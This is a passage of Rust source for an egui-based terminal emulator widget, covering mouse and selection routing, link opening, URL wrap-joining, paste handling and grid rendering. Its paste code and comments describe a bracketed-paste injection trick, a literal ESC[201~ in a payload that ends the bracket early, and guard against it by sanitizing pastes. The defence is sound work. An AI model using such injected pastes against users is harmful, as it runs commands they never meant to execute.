                            let thumb = geom.thumb(grid_rect, off, 8.0);
                            let grab = if thumb.y_range().contains(pos.y) {
                                pos.y - thumb.min.y
                            } else {
                                // Jump: center the thumb on the click.
                                let g = geom.thumb_h / 2.0;
                                backend
                                    .set_display_offset(geom.offset_for_thumb_top(pos.y - g));
                                g
                            };
                            vs.scrollbar_drag = Some(grab);
                            continue;
                        }
                    }
                    // Jump-to-bottom pill (LOW-10): consume the press so it
                    // can't clear a selection or fire a mouse report.
                    if backend.term.grid().display_offset() > 0
                        && jump_pill_rect(grid_rect).contains(pos)
                    {
                        vs.pill_press = true;
                        continue;
                    }
                } else if vs.scrollbar_drag.take().is_some() {
                    continue; // release ends the thumb drag, consumed
                } else if std::mem::take(&mut vs.pill_press) {
                    if jump_pill_rect(grid_rect).contains(pos) {
                        backend.scroll_to_bottom();
                    }
                    continue;
                } else if vs.toolbar_press.take().is_some() {
                    if let Some(c) = chrome {
                        for (rect, btn) in &c.btns {
                            if !rect.contains(pos) {
                                continue;
                            }
                            match btn {
                                BlockBtn::CopyCmd => {
                                    if let Some(cmd) = blocks.and_then(|b| {
                                        b.recs
                                            .binary_search_by_key(&c.start_off, |r| r.start_off)
                                            .ok()
                                            .map(|i| b.recs[i].cmd.clone())
                                    }) {
                                        ctx.copy_text(cmd);
                                    }
                                }
                                BlockBtn::CopyOutput => {
                                    out.block = Some(BlockAction::CopyOutput(c.start_off));
                                }
                                BlockBtn::Rerun => {
                                    if c.rerun_enabled {
                                        out.block = Some(BlockAction::Rerun(c.start_off));
                                    }
                                }
                                BlockBtn::Jump => {
                                    backend.jump_to_line(c.line);
                                    backend.jump_flash =
                                        Some((c.start_off, std::time::Instant::now()));
                                }
                            }
                            break;
                        }
                    }
                    continue;
                }
                let rel = pos - content_rect.min;
                vs.mouse_grid = backend.selection_point(rel.x, rel.y);
                // Ctrl+click on a resolved, uncovered link OPENS it (QOL
                // §6.5) — checked BEFORE mouse-report forwarding, because
                // the hover affordance (underline + PointingHand) ignores
                // MOUSE_MODE and so must the click that cashes it in.
                // claude's TUI keeps ?1003h any-event tracking on, which
                // used to swallow the Ctrl+click as an SGR report — the
                // "opening links no work" bug. Press AND release are
                // consumed; the open fires on release, re-resolved at the
                // release cell (a drag off the link, or Ctrl let go
                // mid-click, opens nothing).
                if pressed {
                    if click_mods.command_only()
                        && link_at(backend, vs.mouse_grid, url_regex, cover_line)
                    {
                        vs.link_press = true;
                        continue;
                    }
                } else if std::mem::take(&mut vs.link_press) {
                    if click_mods.command_only() {
                        open_link_at(backend, vs.mouse_grid, url_regex, cover_line);
                    }
                    continue;
                }
                // MOUSE-FIRST copy over MOUSE_MODE apps (the "no way to copy
                // text out of claude" fix): a plain press is NOT forwarded
                // at press time. A drag becomes a LOCAL selection — TC has
                // never forwarded drag MOTION anyway (the old LeftMove path
                // was gated on vs.dragging, which the forwarding branch
                // never set, so apps only ever saw a press…release pair
                // across different cells: nothing an app could act on) —
                // and only a zero-travel click still reaches the app, as a
                // press+release pair sent together at release time
                // (`defer_click`). Shift+drag stays the guaranteed local
                // path (WT convention, fully silent to the app); wheel and
                // right/middle forwarding are untouched.
                if pressed {
                    vs.deferred_click = defer_click(mode, click_mods.shift, vs.mouse_grid);
                    vs.dragging = true;
                    let ty = if response.double_clicked() {
                        SelectionType::Semantic
                    } else if response.triple_clicked() {
                        SelectionType::Lines
                    } else {
                        backend.clear_selection();
                        SelectionType::Simple
                    };
                    backend.start_selection(ty, rel.x, rel.y);
                    // Copy-on-select (§6.2), word/line commit edges: a
                    // double/triple click IS a completed selection.
                    if opts.copy_on_select
                        && ty != SelectionType::Simple
                        && backend.term.selection.as_ref().is_some_and(|s| !s.is_empty())
                    {
                        copy_selection(ctx, backend);
                    }
                } else {
                    vs.dragging = false;
                    let deferred = vs.deferred_click.take();
                    if backend.term.selection.as_ref().is_some_and(|s| !s.is_empty()) {
                        // Copy-on-select (§6.2), drag-commit edge: the
                        // release ends the selection. The deferred click (if
                        // any) is dropped — the app never learns a local
                        // selection happened.
                        if opts.copy_on_select {
                            copy_selection(ctx, backend);
                        }
                    } else if let (Some(cell), true) = (
                        deferred,
                        backend.term.selection.as_ref().is_some_and(|s| s.is_empty()),
                    ) {
                        // Zero-travel plain click under MOUSE_MODE: the app
                        // gets its click after all — press at the press
                        // cell, release at the release cell (identical for a
                        // true click). Requires the press's EMPTY Simple
                        // selection to still exist: if output cleared the
                        // selection mid-hold (non-alt streaming app) we
                        // can't distinguish click from drag any more, and a
                        // dropped click is safer than a phantom one.
                        backend.mouse_report(
                            MouseButton::Left,
                            click_mods,
                            cell,
                            true,
                            &mut out.write,
                        );
                        backend.mouse_report(
                            MouseButton::Left,
                            click_mods,
                            vs.mouse_grid,
                            false,
                            &mut out.write,
                        );
                    }
                    // A zero-travel click leaves an EMPTY Simple selection —
                    // never copied (no surprise clipboard clobber on plain
                    // clicks). Link opens are handled by the
                    // consume-at-press branch above — by the time
                    // selection-release runs, this release is never a link
                    // click.
                }
            }
            // QOL §3.4: right/middle buttons. Under MOUSE_MODE (no Shift
            // override, no live selection) both forward to the app as xterm
            // buttons 2/1 — press AND release. A live LOCAL selection flips
            // the right-click to the context menu (`rclick_forwards`), and
            // Shift always menus — the Shift-override convention stays ONE
            // rule app-wide. Outside MOUSE_MODE: right-click belongs to the
            // context menu (opened by the caller off this response — R2: no
            // paste-on-right-click) and a middle-click RELEASE pastes
            // (§6.1). Right-click never touches selection state (R4 — true
            // by construction: only Primary drives the selection machine).
            egui::Event::PointerButton {
                button: PointerButton::Secondary,
                pressed,
                pos,
                modifiers: click_mods,
            } if hovered => {
                if pressed {
                    // With a live LOCAL selection the right-click is local
                    // even under MOUSE_MODE — it opens the context menu
                    // (Copy enabled) instead of forwarding, completing the
                    // mouse-only copy path over MOUSE_MODE apps: plain-drag
                    // select → right-click → Copy. No selection ⇒ the app
                    // keeps its right-click exactly as before. Latched at
                    // press so the release always matches the press's
                    // verdict (an app must never see a release for a press
                    // it never got, nor lose the release of one it did get
                    // when the selection changes in between).
                    let has_sel = backend
                        .term
                        .selection
                        .as_ref()
                        .is_some_and(|s| !s.is_empty());
                    vs.rclick_forward = rclick_forwards(mode, click_mods.shift, has_sel);
                }
                if vs.rclick_forward {
                    let rel = pos - content_rect.min;
                    backend.mouse_report(
                        MouseButton::Right,
                        click_mods,
                        backend.selection_point(rel.x, rel.y),
                        pressed,
                        &mut out.write,
                    );
                    out.rclick_forwarded = true;
                    if !pressed {
                        vs.rclick_forward = false;
                    }
                }
            }
            egui::Event::PointerButton {
                button: PointerButton::Middle,
                pressed,
                pos,
                modifiers: click_mods,
            } if hovered => {
                if mode.intersects(TermMode::MOUSE_MODE) && !click_mods.shift {
                    let rel = pos - content_rect.min;
                    backend.mouse_report(
                        MouseButton::Middle,
                        click_mods,
                        backend.selection_point(rel.x, rel.y),
                        pressed,
                        &mut out.write,
                    );
                } else if !pressed {
                    out.middle_paste = true;
                }
            }
            egui::Event::PointerMoved(pos) if vs.dragging || hovered || vs.scrollbar_drag.is_some() => {
                // Live thumb drag (UX MEDIUM-7): absolute mapping — the thumb
                // tracks the pointer even when it wanders out of the lane
                // (standard scrollbar feel); selection never sees the motion.
                if let Some(grab) = vs.scrollbar_drag {
                    if let Some(geom) = ScrollbarGeom::compute(backend, grid_rect) {
                        backend.set_display_offset(geom.offset_for_thumb_top(pos.y - grab));
                    }
                    continue;
                }
                let rel = pos - content_rect.min;
                vs.mouse_grid = backend.selection_point(rel.x, rel.y);
                if vs.dragging {
                    // Always the local selection: drag MOTION is never
                    // forwarded. (The old LeftMove branch could only ever
                    // fire for a press the app never received — the
                    // forwarding branch never set vs.dragging — e.g. Shift
                    // released mid-local-drag. With the deferred-click
                    // design a drag under MOUSE_MODE is BY DESIGN a local
                    // selection, so the branch is gone.)
                    backend.update_selection(rel.x, rel.y);
                }
            }
            _ => {}
        }
    }
}

/// Typing jumps the viewport back to the live bottom, like every terminal.
fn write_and_pin(backend: &mut TermBackend, out: &mut TermViewOutput, bytes: &[u8]) {
    out.write.extend_from_slice(bytes);
    backend.scroll_to_bottom();
}

/// Send a Ctrl+`key` chord: as a win32 key-event pair when the session
/// negotiated win32-input-mode, else as the raw control byte.
fn interrupt_chord(backend: &mut TermBackend, out: &mut TermViewOutput, key: Key, byte: u8) {
    if backend.win32_input {
        if let Some(seq) = crate::win32_input::encode_key(key, egui::Modifiers::CTRL) {
            write_and_pin(backend, out, &seq);
            return;
        }
    }
    write_and_pin(backend, out, &[byte]);
}

fn paste(backend: &mut TermBackend, out: &mut TermViewOutput, text: &str, paste_warn: bool) {
    // QOL §5: the raw grid path is the accident class — a multi-line paste
    // into a non-bracketed shell (PS 5.1 never sets BRACKETED_PASTE)
    // executes every line instantly. When the gate trips, nothing is
    // written; the caller shows the ConfirmPaste modal (which re-encodes at
    // confirm time). Bracketed apps declared "I handle pastes atomically" —
    // never warned (the claude REPL is the heaviest daily flow, DO-NOT 8).
    let bracketed = backend.mode().contains(TermMode::BRACKETED_PASTE);
    if paste_needs_confirm(text, bracketed, paste_warn) {
        out.paste_pending = Some(text.to_string());
        return;
    }
    out.write.extend_from_slice(&paste_bytes(bracketed, text));
    backend.scroll_to_bottom();
}

/// Paste-semantics encoding, shared by the grid path and the App-level
/// routed pastes (drops, menu/middle-click paste, modal confirm) — the
/// bracketed decision is made AT SEND TIME by the caller.
pub(crate) fn paste_bytes(bracketed: bool, text: &str) -> Vec<u8> {
    // Strip controls FIRST (r2-F2): a payload containing a literal
    // `ESC[201~` would close the bracket early and execute the rest —
    // the confirm gate exempts the bracketed path, so this strip is the
    // only defense on the headline paste flow.
    let text = crate::strip::sanitize_paste(text);
    let sanitized = text.replace("\r\n", "\r").replace('\n', "\r");
    let mut out = Vec::with_capacity(sanitized.len() + 12);
    if bracketed {
        out.extend_from_slice(b"\x1b[200~");
        out.extend_from_slice(sanitized.as_bytes());
        out.extend_from_slice(b"\x1b[201~");
    } else {
        out.extend_from_slice(sanitized.as_bytes());
    }
    out
}

/// QOL §5.1 gate: warn only on the raw non-bracketed path, when the paste is
/// multi-line after sanitize (any `\r` runs a command instantly) or large
/// (5000 bytes — WT's precedent). `paste_warn` = Prefs opt-out.
pub(crate) fn paste_needs_confirm(text: &str, bracketed: bool, paste_warn: bool) -> bool {
    if !paste_warn || bracketed {
        return false;
    }
    let sanitized = text.replace("\r\n", "\r").replace('\n', "\r");
    sanitized.contains('\r') || sanitized.len() > 5000
}

/// QOL §6.3: a command-modified wheel is the zoom gesture — the grid must
/// not also scroll (or ship arrow keys under ALTERNATE_SCROLL+alt-screen).
fn wheel_wants_zoom(command: bool) -> bool {
    command
}

fn copy_selection(ctx: &egui::Context, backend: &TermBackend) {
    if let Some(text) = backend.selection_text() {
        ctx.copy_text(text);
    }
}

/// The Ctrl+C verdict (egui folds Ctrl+C into `Event::Copy`): a live
/// selection means COPY — zero bytes reach the app (an interrupt would kill
/// a claude generation mid-stream); no selection means the interrupt chord.
/// Identical on the alt screen (claude): `selection_text` walks the visible
/// grid there, and the alt-exempt output policy keeps the selection alive
/// long enough to be used.
fn ctrl_c_is_copy(backend: &TermBackend) -> bool {
    backend.selection_text().is_some()
}

/// R4-F2 predicate: was this Copy/Cut/Paste event synthesized from an AltGr
/// chord? Windows delivers AltGr as Ctrl+Alt (`command` mirrors ctrl in
/// egui), and egui-winit's is_copy/cut/paste_command checks only `command` —
/// it never excludes alt — so AltGr+C/X/V on layouts where those keys
/// compose characters arrives here as a bogus clipboard event with the real
/// character swallowed. Pure so the polarity table is unit-pinned below.
fn altgr_synthesized(m: egui::Modifiers) -> bool {
    m.alt && (m.ctrl || m.command)
}

/// The plain-drag design call, pinned (the "no way to copy text out of
/// claude" fix): under MOUSE_MODE an unshifted primary press is never
/// forwarded at press time — it latches the press cell so a zero-travel
/// click can deliver the press+release pair together at release, while a
/// drag becomes a local selection the app never learns about. Shift keeps
/// the press fully local (nothing is ever forwarded — the WT-convention
/// guaranteed path), and outside MOUSE_MODE nothing is ever forwarded.
fn defer_click(mode: TermMode, shift: bool, cell: GridPoint) -> Option<GridPoint> {
    (mode.intersects(TermMode::MOUSE_MODE) && !shift).then_some(cell)
}

/// Right-click routing (QOL §3.4 + the mouse-first copy path): forwarded to
/// a MOUSE_MODE app only when the user holds no Shift AND no local selection
/// is live — a selection flips the right-click to the context menu (Copy
/// enabled), completing plain-drag → right-click → Copy without a keyboard.
fn rclick_forwards(mode: TermMode, shift: bool, has_selection: bool) -> bool {
    mode.intersects(TermMode::MOUSE_MODE) && !shift && !has_selection
}

/// A resolved, uncovered link sits at `point` (QOL §6.5). The primary-click
/// router consults this at PRESS time, before mouse-report forwarding and
/// the selection machine, so a Ctrl+click on a link is always the link open
/// the hover affordance promised.
fn link_at(
    backend: &TermBackend,
    point: GridPoint,
    regex: &mut RegexSearch,
    cover_line: Option<i32>,
) -> bool {
    regex_match_at(backend, point, regex)
        .filter(|m| !link_covered(backend, m, cover_line))
        .is_some()
}

fn open_link_at(
    backend: &TermBackend,
    point: GridPoint,
    regex: &mut RegexSearch,
    cover_line: Option<i32>,
) {
    if let Some(url) = link_url_at(backend, point, regex, cover_line) {
        let _ = open::that_detached(url);
    }
}

/// The full URL text under `point` (resolved + uncovered), reading the match
/// span straight off the grid — a multi-row (wrapped) match reads its
/// interior rows edge to edge, which is exactly the URL text: the join rule
/// only chains rows whose seam cells are URL characters.
fn link_url_at(
    backend: &TermBackend,
    point: GridPoint,
    regex: &mut RegexSearch,
    cover_line: Option<i32>,
) -> Option<String> {
    let m =
        regex_match_at(backend, point, regex).filter(|m| !link_covered(backend, m, cover_line))?;
    let mut url = String::new();
    for indexed in backend.term.grid().iter_from(*m.start()) {
        url.push(indexed.c);
        if indexed.point == *m.end() {
            break;
        }
    }
    // iter_from starts *after* start; prepend the first cell.
    let first = backend.term.grid()[*m.start()].c;
    url.insert(0, first);
    Some(url)
}

fn regex_match_at(backend: &TermBackend, point: GridPoint, regex: &mut RegexSearch) -> Option<Match> {
    // Hard-wrap join first (the "long wrapped URL: no hover, no click" fix):
    // a URL wrapped by the APP — claude's ink TUI repaints each visual row
    // separately, so the rows carry no WRAPLINE flags — is invisible to the
    // grid regex below, which only joins soft-wrapped rows. When the hovered
    // row participates in a join chain the joined-line match wins: over the
    // same rows it can only EXTEND a per-row match (a per-row match is a
    // truncated URL — opening it would be worse than nothing).
    joined_match_at(backend, point)
        .or_else(|| visible_regex_match_iter(backend, regex).find(|m| m.contains(&point)))
}

/// String-side twin of `URL_REGEX` for the joined-line scan (same pattern
/// source, same regex-syntax dialect as alacritty's RegexSearch).
fn url_str_regex() -> &'static regex::Regex {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| regex::Regex::new(URL_REGEX).expect("static regex"))
}

/// One character of the URL_REGEX charset class — the join heuristic must
/// agree with the regex about what can continue a URL across a row seam.
fn url_char(c: char) -> bool {
    !(c.is_whitespace()
        || c <= '\u{001F}'
        || ('\u{007F}'..='\u{009F}').contains(&c)
        || matches!(c, '<' | '>' | '"' | '{' | '|' | '}' | '^' | '⟨' | '⟩' | '`'))
}

/// Row `a` flows into row `a+1`: a soft wrap (WRAPLINE — what the grid regex
/// already understands) or the CONSERVATIVE hard-wrap heuristic — row `a`
/// ends mid-URL-charset at its last column AND row `a+1` continues in the
/// charset at column 0. Box-drawing seam cells (U+2500–U+257F) never join:
/// they are TUI frame borders, not URL text (they ARE in the regex charset,
/// so without this exclusion two framed rows would fuse).
fn hard_wrap_joins(backend: &TermBackend, a: i32) -> bool {
    let term = &backend.term;
    let grid = term.grid();
    let cols = term.columns();
    let last = &grid[GridLine(a)][GridColumn(cols - 1)];
    if last.flags.contains(Flags::WRAPLINE) {
        return true;
    }
    let first = &grid[GridLine(a + 1)][GridColumn(0)];
    let seam_ok = |c: char| url_char(c) && !('\u{2500}'..='\u{257F}').contains(&c);
    seam_ok(last.c) && seam_ok(first.c)
}

/// Bound on the join walk in each direction (matches the WRAPLINE walk cap
/// in term_backend: ~a 10k-char URL at 160 cols).
const JOIN_CAP: usize = 64;

/// The joined-line match containing `point`, when the hovered row is part of
/// a wrap chain (soft or heuristic-hard). None when the row stands alone —
/// the per-row grid regex path covers that. Match columns map back through
/// the join byte-for-byte, so the returned Match is exact grid points and
/// every downstream surface (underline paint, cover suppression, click
/// consume, URL extraction) works unchanged.
fn joined_match_at(backend: &TermBackend, point: GridPoint) -> Option<Match> {
    let term = &backend.term;
    let grid = term.grid();
    let cols = term.columns();
    let top = -(grid.history_size() as i32);
    let bottom = term.bottommost_line().0;
    if point.line.0 < top || point.line.0 > bottom {
        return None;
    }
    let mut r0 = point.line.0;
    for _ in 0..JOIN_CAP {
        if r0 - 1 < top || !hard_wrap_joins(backend, r0 - 1) {
            break;
        }
        r0 -= 1;
    }
    let mut r1 = point.line.0;
    for _ in 0..JOIN_CAP {
        if r1 + 1 > bottom || !hard_wrap_joins(backend, r1) {
            break;
        }
        r1 += 1;
    }
    if r0 == r1 {
        return None;
    }
    // Joined text + byte-offset → grid-point map.
    let mut text = String::new();
    let mut cells: Vec<(usize, GridPoint)> = Vec::new();
    for r in r0..=r1 {
        let row = &grid[GridLine(r)];
        // Interior rows are full-width by the join rule; the final row stops
        // at its content edge.
        let len = if r == r1 { row.line_length().0.min(cols) } else { cols };
        for c in 0..len {
            let cell = &row[GridColumn(c)];
            if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
                continue;
            }
            cells.push((text.len(), GridPoint::new(GridLine(r), GridColumn(c))));
            text.push(cell.c);
        }
    }
    let hov = cells.iter().find(|(_, p)| *p == point).map(|(o, _)| *o)?;
    for m in url_str_regex().find_iter(&text) {
        if m.start() <= hov && hov < m.end() {
            let start = cells.iter().find(|(o, _)| *o == m.start())?.1;
            let end = cells.iter().rev().find(|(o, _)| *o < m.end())?.1;
            return Some(start..=end);
        }
    }
    None
}

/// From alacritty/src/display/hint.rs: all visible regex matches.
fn visible_regex_match_iter<'a>(
    backend: &'a TermBackend,
    regex: &'a mut RegexSearch,
) -> impl Iterator<Item = Match> + 'a {
    use alacritty_terminal::index::{Column, Direction, Line};

    let term = &backend.term;
    let viewport_start = Line(-(term.grid().display_offset() as i32));
    let viewport_end = viewport_start + term.bottommost_line();
    let mut start = term.line_search_left(GridPoint::new(viewport_start, Column(0)));
    let mut end = term.line_search_right(GridPoint::new(viewport_end, Column(0)));
    start.line = start.line.max(viewport_start - 100);
    end.line = end.line.min(viewport_end + 100);

    RegexIter::new(start, end, Direction::Right, term, regex)
        .skip_while(move |rm| rm.end().line < viewport_start)
        .take_while(move |rm| rm.start().line <= viewport_end)
}

/// A coalesced horizontal fill run (T3): consecutive same-color cells on a line
/// become one rectangle.
struct Run {
    y0: f32,
    y1: f32,
    x0: f32,
    x1: f32,
    color: Color32,
}

fn flush_run(run: &mut Option<Run>, out: &mut Vec<Shape>) {
    if let Some(r) = run.take() {
        out.push(Shape::Rect(RectShape::filled(
            Rect::from_min_max(Pos2::new(r.x0, r.y0), Pos2::new(r.x1, r.y1)),
            CornerRadius::ZERO,
            r.color,
        )));
    }
}

/// Extend `run` if it continues the same color at the same y and x; else flush
/// and begin a new one.
fn push_cell_run(
    run: &mut Option<Run>,
    out: &mut Vec<Shape>,
    x0: f32,
    x1: f32,
    y0: f32,
    y1: f32,
    color: Color32,
) {
    match run {
        Some(r) if r.color == color && (r.y0 - y0).abs() < 0.01 && (r.x1 - x0).abs() < 0.01 => {
            r.x1 = x1;
        }
        _ => {
            flush_run(run, out);
            *run = Some(Run {
                y0,
                y1,
                x0,
                x1,
                color,
            });
        }
    }
}

/// Floating-scrollbar geometry, shared by render and the thumb hit-test so
/// what you see is exactly what you can grab (UX MEDIUM-7). None when there
/// is no scrollback (no thumb is drawn).
struct ScrollbarGeom {
    track_top: f32,
    /// Track pixels the thumb can travel (track height − thumb height).
    scrollable: f32,
    thumb_h: f32,
    history: usize,
}

impl ScrollbarGeom {
    fn compute(backend: &TermBackend, grid_rect: Rect) -> Option<Self> {
        let history = backend.term.grid().history_size();
        if history == 0 {
            return None;
        }
        let rows = backend.size.rows.max(1) as usize;
        let total = (history + rows) as f32;
        let track_h = grid_rect.height();
        let thumb_h = (track_h * rows as f32 / total).max(24.0);
        Some(Self {
            track_top: grid_rect.min.y,
            scrollable: (track_h - thumb_h).max(0.0),
            thumb_h,
            history,
        })
    }

    /// Thumb rect for the current display offset. `w` = visual width.
    fn thumb(&self, grid_rect: Rect, display_offset: usize, w: f32) -> Rect {
        let frac_from_top = 1.0 - (display_offset as f32 / self.history as f32);
        let top = self.track_top + self.scrollable * frac_from_top;
        Rect::from_min_max(
            Pos2::new(grid_rect.max.x - w, top),
            Pos2::new(grid_rect.max.x, top + self.thumb_h),
        )
    }

    /// Display offset for a thumb-top y (inverse of `thumb`), clamped.
    fn offset_for_thumb_top(&self, y: f32) -> i32 {
        if self.scrollable <= 0.0 {
            return 0;
        }
        let frac_from_top = ((y - self.track_top) / self.scrollable).clamp(0.0, 1.0);
        ((1.0 - frac_from_top) * self.history as f32).round() as i32
    }
}

/// The pointer x-lane owned by the scrollbar (slightly wider than the 8px
/// hover-widened thumb, matching its hover-reveal affordance).
fn in_scrollbar_lane(grid_rect: Rect, pos: Pos2) -> bool {
    pos.x >= grid_rect.max.x - 10.0
        && pos.x <= grid_rect.max.x + PAD_R
        && grid_rect.y_range().contains(pos.y)
}

fn jump_pill_rect(grid_rect: Rect) -> Rect {
    let w = 132.0;
    let h = 24.0;
    let cx = grid_rect.center().x;
    let bottom = grid_rect.max.y - 12.0;
    Rect::from_min_max(
        Pos2::new(cx - w / 2.0, bottom - h),
        Pos2::new(cx + w / 2.0, bottom),
    )
}

#[allow(clippy::too_many_arguments)]
fn render(
    painter: &egui::Painter,
    content_rect: Rect,
    grid_rect: Rect,
    backend: &mut TermBackend,
    font: FontId,
    hovered_link: Option<Match>,
    glyphs: &mut GlyphCache,
    scratch: &mut RenderScratch,
    ppp: f32,
    focused: bool,
    widget_id: egui::Id,
    search_matches: &[Match],
    current_match: Option<Match>,
    blocks: Option<&BlockViewCtx<'_>>,
    chrome: Option<&HoveredBlock>,
    vs: &mut ViewState,
    cover_line: Option<i32>,
    shift_moving: bool,
) -> Option<Rect> {
    let px = |v: f32| (v * ppp).round() / ppp;
    let cell_w = backend.size.cell_width;
    let cell_h = backend.size.cell_height;
    let global_bg = backend.theme.background;
    let line_w = (font.size / 12.0).round().max(1.0);
    // Glyphs are placed from the (possibly shifted) content rect; while a
    // drag-resize outruns the committed grid, rows can overflow the padded
    // rect, so scissor everything to it (chrome all lies inside it too).
    // With blocks active the clip widens LEFT into the padding so the
    // failure gutter can live there without touching column-0 glyphs.
    let clip = if blocks.is_some() {
        Rect::from_min_max(
            Pos2::new(grid_rect.min.x - PAD_L + 3.0, grid_rect.min.y),
            grid_rect.max,
        )
    } else {
        grid_rect
    };
    let painter = painter.with_clip_rect(clip);
    let painter = &painter;
    let origin = Pos2::new(px(content_rect.min.x), px(content_rect.min.y));
    // Persistent scratch buckets (capacity survives across frames; every
    // bucket is drained into the painter below, so they arrive empty).
    let RenderScratch {
        bg: bg_shapes,
        sel: sel_shapes,
        search: search_shapes,
        deco: deco_shapes,
        cursor: cursor_shapes,
        text: text_shapes,
        // Exit chips are SIGNAL chrome: kept out of the grid-content vecs and
        // painted after the presentational covers so a permanent history
        // cover on a failed command's row can never eat the chip (UX HIGH-2).
        chips: chip_shapes,
    } = scratch;

    // Continuity fill: draw scrollback rows into the space the shifted content
    // vacated above the live screen (see content_y_offset). These rows are
    // selectable (selection_point maps negative y into history), so the
    // selection overlay applies here too; search/cursor never do.
    {
        let fill_selection = backend
            .term
            .selection
            .as_ref()
            .and_then(|s| s.to_range(&backend.term));
        let grid = backend.term.grid();
        let history = grid.history_size() as i32;
        let offset = grid.display_offset() as i32;
        let mut i = 1i32;
        while origin.y - cell_h * i as f32 + cell_h > grid_rect.min.y {
            let line_idx = -offset - i;
            if line_idx < -history {
                break;
            }
            let y = px(origin.y - cell_h * i as f32);
            let row = &grid[GridLine(line_idx)];
            let len = row.line_length().0.min(backend.size.cols as usize);
            for c in 0..len {
                let cell = &row[GridColumn(c)];
                if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
                    continue;
                }
                let w = if cell.flags.contains(Flags::WIDE_CHAR) { 2.0 } else { 1.0 };
                let x = px(origin.x + cell_w * c as f32);
                let x_next = px(origin.x + cell_w * (c as f32 + w));
                let mut fgc = cell.fg;
                if cell.flags.contains(Flags::BOLD) {
                    fgc = backend.theme.bold_variant(fgc);
                }
                let mut fg = backend.theme.get_color(fgc);
                let mut bg = backend.theme.get_bg_color(cell.bg);
                if cell.flags.intersects(Flags::DIM | Flags::DIM_BOLD) {
                    fg = fg.linear_multiply(0.66);
                }
                if cell.flags.contains(Flags::INVERSE) {
                    std::mem::swap(&mut fg, &mut bg);
                }
                if bg != global_bg {
                    bg_shapes.push(Shape::Rect(RectShape::filled(
                        Rect::from_min_max(Pos2::new(x, y), Pos2::new(x_next, px(y + cell_h))),
                        CornerRadius::ZERO,
                        bg,
                    )));
                }
                let ch = cell.c;
                // SGR 8 conceal: no glyph (same rule as the main pass).
                if ch != ' ' && ch != '\t' && ch != '\0' && !cell.flags.contains(Flags::HIDDEN) {
                    let key = GlyphKey {
                        ch,
                        bold: cell.flags.contains(Flags::BOLD),
                        italic: cell.flags.contains(Flags::ITALIC),
                    };
                    let galley = painter.fonts_mut(|f| glyphs.get(f, key));
                    text_shapes.push(Shape::galley(Pos2::new(x, y), galley, fg));
                }
            }
            // Selection tint, FULL-WIDTH like the main pass (F5a): the old
            // per-cell tint was clipped to line_length, so the same selection
            // changed silhouette (text-width staircase) the moment its rows
            // crossed from the live grid into the fill region.
            if let Some(r) = fill_selection {
                if line_idx >= r.start.line.0 && line_idx <= r.end.line.0 {
                    let cols = backend.size.cols as f32;
                    let c0 = if line_idx == r.start.line.0 {
                        r.start.column.0 as f32
                    } else {
                        0.0
                    };
                    let c1 = if line_idx == r.end.line.0 {
                        (r.end.column.0 + 1) as f32
                    } else {
                        cols
                    };
                    let x0 = px(origin.x + cell_w * c0);
                    let x1 = px(origin.x + cell_w * c1);
                    if x1 > x0 {
                        sel_shapes.push(Shape::Rect(RectShape::filled(
                            Rect::from_min_max(Pos2::new(x0, y), Pos2::new(x1, px(y + cell_h))),
                            CornerRadius::ZERO,
                            SEL_OVERLAY,
                        )));
                    }
                }
            }
            i += 1;
        }
    }

    // Per-line bucketing of the visible search matches (UX MEDIUM-4): the
    // per-cell highlight check must cost O(matches on that line), not
    // O(all visible matches) — a dense one/two-char query on a large grid
    // otherwise runs millions of range-compares per frame while a Working
    // terminal streams. The key set doubles as the cover/armed-cover
    // suppression line set (selection/search always win over covers).
    let mut search_by_line: std::collections::HashMap<i32, Vec<&Match>> =
        std::collections::HashMap::new();
    for m in search_matches {
        for l in m.start().line.0..=m.end().line.0 {
            search_by_line.entry(l).or_default().push(m);
        }
    }

    let content = backend.term.renderable_content();
    let display_offset = content.display_offset;
    let cursor = content.cursor;
    let selection = content.selection;
    let cursor_visible = cursor.shape != CursorShape::Hidden;

    let mut bg_run: Option<Run> = None;
    let mut sel_run: Option<Run> = None;
    let mut search_run: Option<Run> = None;

    for indexed in content.display_iter {
        let point = indexed.point;
        let flags = indexed.flags;
        if flags.contains(Flags::WIDE_CHAR_SPACER) {
            continue;
        }
        let is_wide = flags.contains(Flags::WIDE_CHAR);
        let width = if is_wide { 2 } else { 1 };

        let col = point.column.0 as f32;
        let line = (point.line.0 + display_offset as i32) as f32;
        let x = px(origin.x + cell_w * col);
        let x_next = px(origin.x + cell_w * (col + width as f32));
        let y = px(origin.y + cell_h * line);
        let y_next = px(y + cell_h);
        if y_next < grid_rect.min.y || y > grid_rect.max.y {
            continue;
        }

        let mut fg_color = indexed.fg;
        if flags.contains(Flags::BOLD) {
            fg_color = backend.theme.bold_variant(fg_color);
        }
        let mut fg = backend.theme.get_color(fg_color);
        let mut bg = backend.theme.get_bg_color(indexed.bg);

        if flags.intersects(Flags::DIM | Flags::DIM_BOLD) {
            fg = fg.linear_multiply(0.66);
        }
        // Reverse video swaps fg/bg. Selection is a separate translucent layer.
        if flags.contains(Flags::INVERSE) {
            std::mem::swap(&mut fg, &mut bg);
        }

        // Background fill run (skip the default background — the card shows).
        if bg != global_bg {
            push_cell_run(&mut bg_run, bg_shapes, x, x_next, y, y_next, bg);
        } else {
            flush_run(&mut bg_run, bg_shapes);
        }

        // Selection overlay run.
        if selection.is_some_and(|r| r.contains(point)) {
            push_cell_run(&mut sel_run, sel_shapes, x, x_next, y, y_next, SEL_OVERLAY);
        } else {
            flush_run(&mut sel_run, sel_shapes);
        }

        // Search highlight run (V4): current match is stronger. Per-line
        // buckets keep this O(matches on this line) per cell (UX MEDIUM-4).
        if !search_matches.is_empty() {
            let cur = current_match.as_ref().is_some_and(|m| m.contains(&point));
            let hit = cur
                || search_by_line
                    .get(&point.line.0)
                    .is_some_and(|ms| ms.iter().any(|m| m.contains(&point)));
            if hit {
                let col = if cur { SEARCH_CURRENT } else { SEARCH_HL };
                push_cell_run(&mut search_run, search_shapes, x, x_next, y, y_next, col);
            } else {
                flush_run(&mut search_run, search_shapes);
            }
        }

        // Cursor.
        let is_cursor = cursor_visible && point == cursor.point;
        let mut glyph_fg = fg;
        if is_cursor {
            let cur_col = backend.theme.get_color(Color::Named(NamedColor::Cursor));
            // Smoothly lerp the cursor rect toward its target cell (V6). Snap on
            // a big jump (>8 cells) or when the viewport scrolled.
            let ctx = painter.ctx();
            let mem_id = widget_id.with("cur_state");
